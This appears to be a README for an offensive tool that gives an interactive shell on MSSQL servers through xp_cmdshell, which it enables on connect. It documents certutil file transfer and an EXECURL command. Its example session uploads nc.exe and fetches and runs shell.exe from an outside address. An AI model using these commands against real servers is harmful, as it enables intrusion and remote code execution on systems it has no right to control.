# mssqlup

An interactive shell over MSSQL's `xp_cmdshell` with file transfer, PowerShell execution, and command history.

## Requirements

```
pip install pymssql tqdm
```

## Usage

```
python3 mssqlup.py -S <server> -U <username> -P <password>
```

## Commands

| Command | Description |
|---|---|
| `<cmd>` | Run a cmd.exe command |
| `cd <path>` | Change directory (persists across commands) |
| `PS <cmd>` | Run a PowerShell one-liner |
| `PSSHELL` | Drop into an interactive PowerShell prompt |
| `UPLOAD <local> [remote]` | Upload a file via base64 + certutil |
| `DOWNLOAD <remote> [local]` | Download a file via certutil encode |
| `EXECURL <url>` | Fetch and run a remote executable via certutil |
| `exit` | Close the connection and quit |

## Features

- Auto-enables `xp_cmdshell` on connect
- Colored prompt showing `user@host:cwd`
- Persistent command history (`/tmp/.mssql_shell_history`)
- Tab completion for built-in commands
- MD5 verification on uploads
- CLIXML/PowerShell error stream filtering

## Example

```
$ python3 mssqlup.py -S 10.10.10.1 -U sa -P 'P@ssw0rd'

[+] Connecting to 10.10.10.1...
[+] Successful login: sa@10.10.10.1
[+] xp_cmdshell enabled

sa@MSSQL:C:\$ whoami
nt service\mssqlserver

sa@MSSQL:C:\$ PS Get-LocalUser | Select Name, Enabled
sa@MSSQL:C:\$ UPLOAD ./nc.exe C:\Windows\Temp\nc.exe
sa@MSSQL:C:\$ EXECURL http://10.10.14.1/shell.exe
```
